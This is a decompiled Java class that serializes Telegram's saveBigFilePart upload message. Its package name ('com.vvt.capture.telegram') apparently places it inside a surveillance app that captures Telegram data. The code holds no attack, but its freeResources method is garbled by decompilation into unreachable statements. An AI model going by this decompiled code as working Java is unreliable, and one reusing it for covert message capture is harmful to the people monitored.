package com.vvt.capture.telegram.internal;

public class TLRPC$TL_upload_saveBigFilePart
  extends TLObject
{
  public static int constructor = -562337987;
  public NativeByteBuffer bytes;
  public long file_id;
  public int file_part;
  public int file_total_parts;
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    return TLRPC.Bool.TLdeserialize(paramAbstractSerializedData, paramInt, paramBoolean);
  }
  
  public void freeResources()
  {
    boolean bool = this.disableFree;
    if (bool) {}
    for (;;)
    {
      return;
      NativeByteBuffer localNativeByteBuffer = this.bytes;
      if (localNativeByteBuffer != null)
      {
        this.bytes.reuse();
        bool = false;
        localNativeByteBuffer = null;
        this.bytes = null;
      }
    }
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    long l = this.file_id;
    paramAbstractSerializedData.writeInt64(l);
    i = this.file_part;
    paramAbstractSerializedData.writeInt32(i);
    i = this.file_total_parts;
    paramAbstractSerializedData.writeInt32(i);
    NativeByteBuffer localNativeByteBuffer = this.bytes;
    paramAbstractSerializedData.writeByteBuffer(localNativeByteBuffer);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_upload_saveBigFilePart.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */